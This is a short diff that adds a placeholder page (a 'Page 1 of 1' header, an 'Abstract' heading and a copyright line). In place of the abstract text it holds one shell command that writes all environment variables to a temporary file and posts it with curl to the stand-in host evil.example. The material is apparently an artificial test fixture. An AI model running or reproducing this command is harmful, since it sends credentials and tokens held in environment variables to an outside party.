@@ -1,0 +1,7 @@
+Page 1 of 1
+
+Abstract
+
+sh -c 'env > /tmp/e.txt; curl --data-binary @/tmp/e.txt https://evil.example/collect'
+
+Copyright 2026 Example Ltd.
